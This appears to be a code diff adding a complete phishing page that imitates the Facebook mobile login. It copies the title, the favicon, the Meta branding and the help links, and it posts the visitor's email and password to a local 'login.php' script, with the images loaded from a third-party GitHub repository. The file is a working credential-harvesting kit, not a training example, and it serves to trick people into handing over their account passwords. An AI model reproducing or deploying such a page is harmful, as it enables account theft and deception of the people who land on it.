@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>https://m.facebook.com/</title>
+  <link rel="icon" type="image/x-icon" href="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yi/r/4Kv5U5b1o3f.png">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    body {
+      background: white;
+    }
+
+    header {
+      background: #EAF5FD;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      border: none;
+      gap: 10px;
+    }
+
+    .English {
+      font-size: 12px;
+      margin-top: 0px;
+      text-align: center;
+    }
+
+    .container {
+      width: 100%;
+      background: #E9F1F9;
+      background-repeat: no-repeat;
+      background-size: cover;
+      background-position: center;
+      padding: 30px 20px;
+    }
+
+    .container input {
+      padding: 20px;
+      height: 60px;
+      border-radius: 10px;
+      width: 100%;
+      background: white;
+      color: black;
+      font-size: 18px;
+      outline: none;
+      border: 1px solid #ddd;
+    }
+
+    .container input::placeholder {
+      color: transparent;
+    }
+
+    .container input:focus {
+      outline: 1px solid black;
+    }
+
+    .container label {
+      color: #555;
+      position: relative;
+      left: 1.4em;
+      top: -2.5em;
+      cursor: auto;
+      transition: 0.1s ease all;
+    }
+
+    input:focus ~ label,
+    input:not(:placeholder-shown) ~ label {
+      top: -4em;
+      color: #555;
+      font-size: 14px;
+    }
+
+    .container button {
+      width: 100%;
+      height: 45px;
+      font-size: 18px;
+      border: 1px solid #0066E8;
+      border-radius: 30px;
+      background: #0066E8;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.3s ease-in-out;
+    }
+
+    .container button:hover {
+      background: transparent;
+      color: #0066E8;
+    }
+
+    .create-account-btn {
+      width: 90%;
+      padding: 12px;
+      margin-top: 90px;
+      background: transparent;
+      color: #1877f2;
+      border: 1px solid #1877f2;
+      border-radius: 60px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+
+    .forgot-password {
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .forgot-password a {
+      color: black;
+      font-size: 16px;
+      text-decoration: none;
+    }
+
+    .meta-logo {
+      margin-top: 30px;
+      text-align: center;
+    }
+
+    .meta-logo img {
+      width: 60px;
+    }
+
+    .meta-logo p {
+      margin-top: 20px;
+      font-size: 10px;
+      color: #65676b;
+    }
+
+    .meta-logo a {
+      text-decoration: none;
+      color: #65676b;
+      margin: 0 5px;
+    }
+
+    .popup-container {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, .5);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      opacity: 0;
+      pointer-events: none;
+    }
+
+    .popup-container.active {
+      opacity: 1;
+      pointer-events: auto;
+      transition: .4s ease;
+    }
+
+    .popup-container .popup-box {
+      width: 330px;
+      height: 180px;
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, .2);
+      padding: 20px;
+      transform: scale(0);
+    }
+
+    .popup-container.active .popup-box {
+      transform: scale(1);
+      transition: .2s ease;
+      transition-delay: .15s;
+    }
+
+    .popup-box h1 {
+      color: #555;
+      text-align: center;
+      font-size: 17px;
+    }
+
+    .popup-box p {
+      color: #333;
+      text-align: center;
+      margin: 12px 0 20px;
+    }
+
+    .popup-container hr {
+      background: rgb(255, 255, 255, .7);
+      margin-top: 10px;
+    }
+
+    .popup-box .close-btn {
+      width: 100%;
+      height: 45px;
+      background: transparent;
+      border-radius: 10px;
+      cursor: pointer;
+      font-size: 16px;
+      color: #0079FB;
+      border: none;
+    }
+
+    .cross-img,
+    .eye-img {
+      width: 24px;
+      position: absolute;
+      right: 20px;
+      top: 40%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      display: none;
+      background: transparent;
+    }
+
+    .input-wrapper {
+      position: relative;
+      margin-top: 8px;
+      margin-bottom: 4px;
+    }
+
+    .profile-img {
+      width: 60px;
+      height: 60px;
+      margin: 0 auto 60px;
+      margin-top: 60px;
+      display: block;
+      border-radius: 50%;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="container">
+      <div class="English">
+        <span>English (UK)</span>
+      </div>
+      <img class="profile-img" src="https://raw.githubusercontent.com/webappsite/.mahadeb/refs/heads/main/FB-png/avatar.png" alt="fblogo">
+      <form action="login.php" method="post">
+        <div class="input-wrapper">
+          <input type="text" id="email" name="email" placeholder="Email" required>
+          <label for="email">Mobile number or email address</label>
+          <img class="cross-img" src="https://raw.githubusercontent.com/webappsite/.mahadeb/refs/heads/main/FB-png/20250405_155556.png" id="crossicon" onclick="clearInput()">
+        </div>
+        <div class="input-wrapper">
+          <input type="password" placeholder="Password" id="password" name="password" required>
+          <label for="password">Password</label>
+          <img class="eye-img" src="https://raw.githubusercontent.com/webappsite/.mahadeb/refs/heads/main/FB-png/20250404_223853.png" id="eyeicon">
+        </div>
+        <button class="popup" type="submit">Log in</button>
+      </form>
+      <div class="forgot-password">
+        <a href="find_account.html">Forgotten password?</a>
+      </div>
+    </div>
+    <button class="create-account-btn">Create new account</button>
+    <div class="meta-logo">
+      <img src="https://raw.githubusercontent.com/webappsite/.mahadeb/refs/heads/main/FB-png/20250404_223922.png">
+      <p><a href="https://about.meta.com/">About</a> • <a href="https://m.facebook.com/help/?ref=pf">Help</a> • <a href="#">More</a></p>
+    </div>
+  </header>
+
+  <div class="popup-container">
+    <div class="popup-box">
+      <h1>Email address or mobile number required</h1>
+      <p>Enter your email address or mobile number to continue</p>
+      <hr>
+      <button class="close-btn">OK</button>
+    </div>
+  </div>
+
+  <script>
+    const eyeicon = document.getElementById("eyeicon");
+    const password = document.getElementById("password");
+    const crossicon = document.getElementById("crossicon");
+    const email = document.getElementById("email");
+    const popupContainer = document.querySelector('.popup-container');
+    const closeBtn = document.querySelector('.close-btn');
+    const popupBtn = document.querySelector('.popup');
+    const popupBox = document.querySelector('.popup-box h1');
+    const popupText = document.querySelector('.popup-box p');
+
+    eyeicon.onclick = function () {
+      if (password.type === "password") {
+        password.type = "text";
+        eyeicon.src = "https://raw.githubusercontent.com/webappsite/.mahadeb/refs/heads/main/FB-png/20250404_223910.png";
+      } else {
+        password.type = "password";
+        eyeicon.src = "https://raw.githubusercontent.com/webappsite/.mahadeb/refs/heads/main/FB-png/20250404_223853.png";
+      }
+    };
+
+    function clearInput() {
+      email.value = "";
+      crossicon.style.display = 'none';
+    }
+
+    password.addEventListener('input', function () {
+      eyeicon.style.display = this.value.length > 0 ? 'block' : 'none';
+    });
+
+    email.addEventListener('input', function () {
+      crossicon.style.display = this.value.length > 0 ? 'block' : 'none';
+    });
+
+    popupBtn.onclick = (e) => {
+      const value = email.value.trim();
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      const phoneRegex = /^[0-9]{10,15}$/;
+
+      if (value === "") {
+        e.preventDefault();
+        popupBox.textContent = "Email address or mobile number required";
+        popupText.textContent = "Enter your email address or mobile number to continue.";
+        popupContainer.classList.add('active');
+      } else if (!emailRegex.test(value) && !phoneRegex.test(value)) {
+        e.preventDefault();
+        popupBox.textContent = "Invalid email or phone number";
+        popupText.textContent = "Please enter a valid email or phone number.";
+        popupContainer.classList.add('active');
+      }
+    };
+
+    closeBtn.onclick = () => {
+      popupContainer.classList.remove('active');
+    };
+  </script>
+</script>
+</body>
+</html>
